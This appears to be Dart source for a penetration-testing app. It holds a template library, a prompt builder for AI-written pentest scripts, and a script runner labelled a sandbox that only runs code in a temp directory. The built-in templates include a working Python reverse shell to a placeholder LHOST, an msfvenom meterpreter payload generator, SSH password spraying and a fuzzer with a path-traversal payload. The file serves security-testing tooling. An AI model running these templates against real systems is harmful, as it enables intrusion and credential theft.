/// 脚本生成：模板库存储、AI 生成 prompt、沙箱执行。
library;

import 'dart:async';
import 'dart:convert';

import 'package:flutter/foundation.dart';
import 'dart:io';

import 'package:path/path.dart' as p;

import '../../../services/app_paths.dart';
import 'security_process_runner.dart';

/// 一个脚本模板。
class ScriptTemplate {
  final String id;
  final String name;
  final String category;

  /// python / bash / ruby。
  final String language;
  final String body;

  /// 需要用户填写的参数名列表（如 `['LHOST', 'LPORT']`）。
  final List<String> placeholders;
  final bool builtIn;
  final DateTime createdAt;

  const ScriptTemplate({
    required this.id,
    required this.name,
    required this.category,
    required this.language,
    required this.body,
    this.placeholders = const [],
    this.builtIn = false,
    required this.createdAt,
  });

  Map<String, dynamic> toJson() => {
    'id': id,
    'name': name,
    'category': category,
    'language': language,
    'body': body,
    'placeholders': placeholders,
    'built_in': builtIn,
    'created_at': createdAt.millisecondsSinceEpoch,
  };

  static ScriptTemplate? fromJson(Map<String, dynamic> json) {
    final id = json['id'] as String?;
    final name = json['name'] as String?;
    if (id == null || name == null) return null;
    return ScriptTemplate(
      id: id,
      name: name,
      category: json['category'] as String? ?? '自定义',
      language: json['language'] as String? ?? 'python',
      body: json['body'] as String? ?? '',
      placeholders: (json['placeholders'] is List
          ? (json['placeholders'] as List).map((e) => e.toString()).toList()
          : const <String>[]),
      builtIn: json['built_in'] == true,
      createdAt: DateTime.fromMillisecondsSinceEpoch(
        (json['created_at'] as num?)?.toInt() ?? 0,
      ),
    );
  }
}

/// 内置模板（10+，覆盖 spec 要求的常用场景）。
abstract final class BuiltInTemplates {
  static const _reverseShellPython = r'''
#!/usr/bin/env python3
"""反弹 Shell — Python。LHOST/LPORT 需替换为实际监听地址。"""
import socket
import subprocess
import os

LHOST = "{{LHOST}}"
LPORT = {{LPORT}}

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((LHOST, LPORT))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])

if __name__ == "__main__":
    main()
''';

  static const _portScanPython = r'''
#!/usr/bin/env python3
"""简易 TCP 端口扫描（教学用，正式扫描请用 nmap）。"""
import socket
from concurrent.futures import ThreadPoolExecutor

TARGET = "{{TARGET}}"
PORTS = range(1, 1024)

def scan(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(0.5)
        if s.connect_ex((TARGET, port)) == 0:
            return port
    return None

if __name__ == "__main__":
    with ThreadPoolExecutor(max_workers=100) as pool:
        for port in pool.map(scan, PORTS):
            if port:
                print(f"[+] {TARGET}:{port} open")
''';

  static const _smbEnumPython = r'''
#!/usr/bin/env python3
"""SMB 用户名枚举（依赖 impacket: pip install impacket）。"""
from impacket.smbconnection import SMBConnection

TARGET = "{{TARGET}}"

def main():
    conn = SMBConnection(TARGET, TARGET)
    print(f"[+] {TARGET} 支持 SMB")
    print("[+] 共享:", conn.listShares())

if __name__ == "__main__":
    main()
''';

  static const _httpEnumBash = r'''
#!/bin/bash
# HTTP 目录与文件枚举
TARGET="{{TARGET}}"
WORDLIST="${WORDLIST:-/usr/share/wordlists/dirb/common.txt}"
while read -r path; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/$path")
  [ "$code" != "404" ] && echo "[$code] /$path"
done < "$WORDLIST"
''';

  static const _bruteFrameworkPython = r'''
#!/usr/bin/env python3
"""通用口令爆破框架。仅用于授权测试。"""
import itertools
import sys

TARGET = "{{TARGET}}"
USERNAME = "{{USERNAME}}"

def attempt(password: str) -> bool:
    # TODO: 填入实际的认证请求逻辑
    return False

if __name__ == "__main__":
    for length in range(1, 5):
        for combo in itertools.product("abc123", repeat=length):
            if attempt("".join(combo)):
                print(f"[+] 命中口令: {''.join(combo)}")
                sys.exit(0)
''';

  static const _payloadGenBash = r'''
#!/bin/bash
# Payload 生成（msfvenom）
LHOST="{{LHOST}}"
LPORT="{{LPORT}}"
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f exe -o payload.exe
''';

  static const _trafficAnalysisPython = r'''
#!/usr/bin/env python3
"""抓包统计：按协议聚合包数（依赖 scapy）。"""
from collections import Counter
from scapy.all import sniff, IP

counter = Counter()

def handle(pkt):
    if pkt.haslayer(IP):
        counter[pkt[IP].proto] += 1

if __name__ == "__main__":
    print("按 Ctrl+C 停止…")
    try:
        sniff(prn=handle, count=1000)
    finally:
        for proto, n in counter.most_common():
            print(f"proto {proto}: {n} 包")
''';

  static const _reportScriptPython = r'''
#!/usr/bin/env python3
"""自动化报告脚本：汇总扫描结果为 Markdown。"""
import json
import sys

def main(path):
    with open(path) as f:
        data = json.load(f)
    print("# 扫描摘要")
    for host in data.get("hosts", []):
        print(f"\n## {host['ip']}")
        for port in host.get("ports", []):
            print(f"- {port['port']}/{port['service']}")

if __name__ == "__main__":
    main(sys.argv[1] if len(sys.argv) > 1 else "scan.json")
''';

  static const _sshSprayRuby = r'''
#!/usr/bin/env ruby
# SSH 口令喷洒（仅授权测试）
require 'net/ssh'

TARGET = "{{TARGET}}"
USERS = %w[root admin]

def attempt(user, password)
  Net::SSH.start(TARGET, user, password, non_interactive: true, timeout: 5)
  true
rescue StandardError
  false
end

USERS.each { |u| puts "[+] #{u} 可登录" if attempt(u, "changeme") }
''';

  static const _fuzzHttpPython = r'''
#!/usr/bin/env python3
"""HTTP 参数 fuzz（简易版）。"""
import requests
import sys

TARGET = "{{TARGET}}"
PARAM = "{{PARAM}}"
PAYLOADS = ["'", "\"", "<script>", "../../etc/passwd"]

def main():
    for payload in PAYLOADS:
        r = requests.get(TARGET, params={PARAM: payload}, timeout=5)
        if payload in r.text or r.status_code >= 500:
            print(f"[!] {PARAM}={payload} → {r.status_code}")

if __name__ == "__main__":
    main()
''';

  static const _msfRpcPython = r'''
#!/usr/bin/env python3
"""MSFRPC 调用示例。"""
import requests
import json

HOST = "{{RHOST}}"
PASSWORD = "{{PASSWORD}}"

def login():
    r = requests.post(f"http://{HOST}:55553/api/v1/auth/login",
                      json={"username": "msf", "password": PASSWORD})
    return r.json()["token"]

if __name__ == "__main__":
    print("[+] token:", login())
''';

  static final List<ScriptTemplate> all = [
    ScriptTemplate(
      id: 'builtin-reverse-shell-py',
      name: '反弹 Shell - Python',
      category: '反弹 Shell',
      language: 'python',
      body: _reverseShellPython,
      placeholders: const ['LHOST', 'LPORT'],
      builtIn: true,
      createdAt: DateTime.utc(2026, 1, 1),
    ),
    ScriptTemplate(
      id: 'builtin-port-scan-py',
      name: '端口扫描 - Python',
      category: '端口扫描',
      language: 'python',
      body: _portScanPython,
      placeholders: const ['TARGET'],
      builtIn: true,
      createdAt: DateTime.utc(2026, 1, 1),
    ),
    ScriptTemplate(
      id: 'builtin-smb-enum-py',
      name: 'SMB 枚举 - Python',
      category: '服务枚举',
      language: 'python',
      body: _smbEnumPython,
      placeholders: const ['TARGET'],
      builtIn: true,
      createdAt: DateTime.utc(2026, 1, 1),
    ),
    ScriptTemplate(
      id: 'builtin-http-enum-sh',
      name: 'HTTP 枚举 - Bash',
      category: '服务枚举',
      language: 'bash',
      body: _httpEnumBash,
      placeholders: const ['TARGET', 'WORDLIST'],
      builtIn: true,
      createdAt: DateTime.utc(2026, 1, 1),
    ),
    ScriptTemplate(
      id: 'builtin-brute-py',
      name: '爆破框架 - Python',
      category: '口令爆破',
      language: 'python',
      body: _bruteFrameworkPython,
      placeholders: const ['TARGET', 'USERNAME'],
      builtIn: true,
      createdAt: DateTime.utc(2026, 1, 1),
    ),
    ScriptTemplate(
      id: 'builtin-payload-sh',
      name: 'Payload 生成 - Bash',
      category: 'Payload 生成',
      language: 'bash',
      body: _payloadGenBash,
      placeholders: const ['LHOST', 'LPORT'],
      builtIn: true,
      createdAt: DateTime.utc(2026, 1, 1),
    ),
    ScriptTemplate(
      id: 'builtin-traffic-py',
      name: '流量分析 - Python',
      category: '流量分析',
      language: 'python',
      body: _trafficAnalysisPython,
      builtIn: true,
      createdAt: DateTime.utc(2026, 1, 1),
    ),
    ScriptTemplate(
      id: 'builtin-report-py',
      name: '自动报告 - Python',
      category: '自动化报告',
      language: 'python',
      body: _reportScriptPython,
      builtIn: true,
      createdAt: DateTime.utc(2026, 1, 1),
    ),
    ScriptTemplate(
      id: 'builtin-ssh-spray-rb',
      name: 'SSH 喷洒 - Ruby',
      category: '口令爆破',
      language: 'ruby',
      body: _sshSprayRuby,
      placeholders: const ['TARGET'],
      builtIn: true,
      createdAt: DateTime.utc(2026, 1, 1),
    ),
    ScriptTemplate(
      id: 'builtin-http-fuzz-py',
      name: 'HTTP 参数 Fuzz - Python',
      category: '服务枚举',
      language: 'python',
      body: _fuzzHttpPython,
      placeholders: const ['TARGET', 'PARAM'],
      builtIn: true,
      createdAt: DateTime.utc(2026, 1, 1),
    ),
    ScriptTemplate(
      id: 'builtin-msf-rpc-py',
      name: 'MSFRPC 调用 - Python',
      category: 'Payload 生成',
      language: 'python',
      body: _msfRpcPython,
      placeholders: const ['RHOST', 'PASSWORD'],
      builtIn: true,
      createdAt: DateTime.utc(2026, 1, 1),
    ),
  ];
}

/// 模板库持久化（JSON 文件 + 内置模板合并）。
class ScriptTemplateStore {
  ScriptTemplateStore._();
  static final ScriptTemplateStore instance = ScriptTemplateStore._();

  List<ScriptTemplate>? _cache;

  static File get _file => AppPaths.scriptTemplatesFile;

  /// 全部模板：内置 + 用户保存的。
  Future<List<ScriptTemplate>> all() async {
    if (_cache != null) return _cache!;
    final user = await _loadUser();
    _cache = [...BuiltInTemplates.all, ...user];
    return _cache!;
  }

  Future<List<ScriptTemplate>> _loadUser() async {
    try {
      if (!_file.existsSync()) return const [];
      final decoded = jsonDecode(_file.readAsStringSync());
      if (decoded is! List) return const [];
      return decoded
          .whereType<Map>()
          .map((e) => ScriptTemplate.fromJson(Map<String, dynamic>.from(e)))
          .whereType<ScriptTemplate>()
          .toList();
    } catch (_) {
      // JSON 损坏时退化为只有内置模板，别让脚本库整个打不开。
      return const [];
    }
  }

  Future<void> save(ScriptTemplate template) async {
    final user = List<ScriptTemplate>.of(await _loadUser());
    user.removeWhere((t) => t.id == template.id);
    user.add(template);
    await _write(user);
    _cache = null;
  }

  Future<void> delete(String id) async {
    final user = List<ScriptTemplate>.of(await _loadUser())
      ..removeWhere((t) => t.id == id);
    await _write(user);
    _cache = null;
  }

  Future<void> _write(List<ScriptTemplate> user) async {
    try {
      final dir = _file.parent;
      if (!dir.existsSync()) dir.createSync(recursive: true);
      _file.writeAsStringSync(
        jsonEncode([for (final t in user) t.toJson()]),
      );
    } catch (_) {
      // 磁盘不可写时静默失败：模板仍留在内存里供本次会话使用。
    }
  }

  /// 按分类分组（模板库 UI 用）。
  static Map<String, List<ScriptTemplate>> groupByCategory(
    List<ScriptTemplate> templates,
  ) {
    final out = <String, List<ScriptTemplate>>{};
    for (final t in templates) {
      out.putIfAbsent(t.category, () => []).add(t);
    }
    return out;
  }
}

/// 脚本生成 prompt 的构造。
String buildScriptPrompt({
  required String description,
  String language = 'python',
  String? targetContext,
}) {
  final buf = StringBuffer()
    ..writeln('你是一名渗透测试脚本编写专家。请根据下面的需求生成一段可直接运行的')
    ..writeln('$language 脚本，要求：')
    ..writeln('1. 参数化输入，用 `{{NAME}}` 标注需要用户填写的变量')
    ..writeln('2. 输出结构化、可读')
    ..writeln('3. 只输出代码本身，不要解释')
    ..writeln()
    ..writeln('【需求】$description');
  if (targetContext != null && targetContext.isNotEmpty) {
    buf.writeln('【目标上下文】$targetContext');
  }
  return buf.toString();
}

/// 从 AI 回复里抠出代码块（```python ... ``` 或 ``` ... ```）。
String extractCodeBlock(String reply, {String? language}) {
  final pattern = language != null
      ? RegExp('```$language\\s*([\\s\\S]*?)```')
      : RegExp(r'```[a-zA-Z]*\s*([\s\S]*?)```');
  final match = pattern.firstMatch(reply);
  if (match != null) return match.group(1)!.trim();
  // 没有代码块围栏时，退化为整个回复（模型有时直接给代码）。
  return reply.trim();
}

/// 沙箱执行的一次输出事件。
@immutable
class ScriptRunEvent {
  /// [EventKind] 之一。
  final String kind;
  final String text;

  const ScriptRunEvent(this.kind, this.text);

  bool get isStdout => kind == EventKind.stdout;
  bool get isStderr => kind == EventKind.stderr;

  const ScriptRunEvent.stdout(this.text) : kind = EventKind.stdout;
  const ScriptRunEvent.stderr(this.text) : kind = EventKind.stderr;
  const ScriptRunEvent.finished(int exitCode)
    : kind = EventKind.done,
      text = 'exit=$exitCode';
  const ScriptRunEvent.failure(this.text) : kind = EventKind.error;
}

/// 事件类型常量。[ScriptRunEvent] 的工厂构造与这些常量同名会撞车，
/// 所以单独放一个类。
abstract final class EventKind {
  static const stdout = 'stdout';
  static const stderr = 'stderr';
  static const done = 'done';
  static const error = 'error';
}

/// 脚本沙箱执行服务。
///
/// 脚本落临时文件后按语言选解释器（python3/bash/ruby）。
/// 只支持 SIGTERM 优雅停止——SIGKILL 会留下半截输出且不给脚本清理机会。
class ScriptSandboxService {
  ScriptSandboxService._();
  static final ScriptSandboxService instance = ScriptSandboxService._();

  Process? _current;
  bool get isRunning => _current != null;

  /// 执行脚本，输出经 [stream] 逐条抛出。
  Future<void> run(
    String code,
    String language, {
    Duration timeout = const Duration(minutes: 10),
    StreamController<ScriptRunEvent>? controller,
    void Function(ScriptRunEvent event)? onEvent,
  }) async {
    final interpreter = switch (language) {
      'python' => 'python3',
      'bash' => 'bash',
      'ruby' => 'ruby',
      _ => 'bash',
    };
    final resolved = resolveExecutable(interpreter);
    if (resolved == null) {
      _emit(
        controller,
        onEvent,
        ScriptRunEvent.failure('未找到解释器 $interpreter'),
      );
      return;
    }

    File? scriptFile;
    try {
      final dir = Directory.systemTemp.createTempSync('sec_script_');
      final ext = language == 'python'
          ? '.py'
          : language == 'ruby'
          ? '.rb'
          : '.sh';
      scriptFile = File(p.join(dir.path, 'script$ext'));
      scriptFile.writeAsStringSync(code);
      if (ext == '.sh') {
        // bash 脚本要可执行位
        Process.runSync('chmod', ['+x', scriptFile.path]);
      }

      final process = await Process.start(
        resolved,
        [scriptFile.path],
        workingDirectory: dir.path,
        environment: processEnvironment,
        includeParentEnvironment: false,
      );
      _current = process;

      await Future.wait([
        process.stdout
            .transform(utf8.decoder)
            .transform(const LineSplitter())
            .forEach((line) => _emit(
              controller,
              onEvent,
              ScriptRunEvent.stdout(line),
            )),
        process.stderr
            .transform(utf8.decoder)
            .transform(const LineSplitter())
            .forEach((line) => _emit(
              controller,
              onEvent,
              ScriptRunEvent.stderr(line),
            )),
      ]).timeout(
        timeout,
        onTimeout: () {
          stop();
          return <void>[];
        },
      );
      final exitCode = await process.exitCode;
      _emit(controller, onEvent, ScriptRunEvent.finished(exitCode));
    } catch (e) {
      _emit(controller, onEvent, ScriptRunEvent.failure(e.toString()));
    } finally {
      _current = null;
      try {
        scriptFile?.parent.deleteSync(recursive: true);
      } catch (_) {
        // 临时目录清理失败不影响结果。
      }
    }
  }

  /// 停止当前脚本。
  void stop() {
    _current?.kill(ProcessSignal.sigterm);
    _current = null;
  }

  void _emit(
    StreamController<ScriptRunEvent>? controller,
    void Function(ScriptRunEvent)? onEvent,
    ScriptRunEvent event,
  ) {
    controller?.add(event);
    onEvent?.call(event);
  }
}
